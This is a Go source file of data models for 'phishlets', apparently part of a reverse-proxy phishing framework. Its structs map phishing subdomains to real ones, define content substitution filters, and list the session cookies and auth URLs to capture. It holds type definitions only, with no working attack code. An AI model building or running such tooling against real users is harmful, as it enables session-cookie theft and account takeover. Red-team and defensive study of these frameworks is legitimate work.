package models

import (
	"time"
)

type Phishlet struct {
	ID           string        `json:"id" db:"id"`
	Name         string        `json:"name" db:"name"`
	DisplayName  string        `json:"display_name" db:"display_name"`
	Author       string        `json:"author" db:"author"`
	Version      string        `json:"version" db:"version"`
	RedirectURL  string        `json:"redirect_url" db:"redirect_url"`
	ProxyHosts   []ProxyHost   `json:"proxy_hosts" db:"proxy_hosts"`
	SubFilters   []SubFilter   `json:"sub_filters" db:"sub_filters"`
	AuthTokens   []AuthToken   `json:"auth_tokens" db:"auth_tokens"`
	AuthUrls     []AuthUrl     `json:"auth_urls" db:"auth_urls"`
	IsTemplate   bool          `json:"is_template" db:"is_template"`
	IsEnabled    bool          `json:"is_enabled" db:"is_enabled"`
	IsVisible    bool          `json:"is_visible" db:"is_visible"`
	Hostname     string        `json:"hostname" db:"hostname"`
	UnauthURL    string        `json:"unauth_url" db:"unauth_url"`
	CreateTime   time.Time     `json:"create_time" db:"create_time"`
	UpdateTime   time.Time     `json:"update_time" db:"update_time"`
}

type ProxyHost struct {
	PhishSubdomain string `json:"phish_subdomain" db:"phish_subdomain"`
	OrigSubdomain  string `json:"orig_subdomain" db:"orig_subdomain"`
	Domain         string `json:"domain" db:"domain"`
	HandleSession  string `json:"handle_session" db:"handle_session"`
	IsLanding      bool   `json:"is_landing" db:"is_landing"`
	AutoFilter     bool   `json:"auto_filter" db:"auto_filter"`
}

type SubFilter struct {
	Hostname string          `json:"hostname" db:"hostname"`
	Rules    []SubFilterRule `json:"rules" db:"rules"`
}

type SubFilterRule struct {
	TriggersOn   string `json:"triggers_on" db:"triggers_on"`
	OrigSub      string `json:"orig_sub" db:"orig_sub"`
	PhishSub     string `json:"phish_sub" db:"phish_sub"`
	MimeType     string `json:"mime_type" db:"mime_type"`
	RedirectOnly string `json:"redirect_only" db:"redirect_only"`
}

type AuthToken struct {
	Domain string             `json:"domain" db:"domain"`
	Keys   []CookieAuthToken  `json:"keys" db:"keys"`
}

type CookieAuthToken struct {
	Name     string `json:"name" db:"name"`
	Re       string `json:"re" db:"re"`
	Optional bool   `json:"optional" db:"optional"`
}

type AuthUrl struct {
	URL    string `json:"url" db:"url"`
	Domain string `json:"domain" db:"domain"`
}

type PhishletStats struct {
	TotalPhishlets   int `json:"total_phishlets"`
	EnabledPhishlets int `json:"enabled_phishlets"`
	ActiveCampaigns  int `json:"active_campaigns"`
}
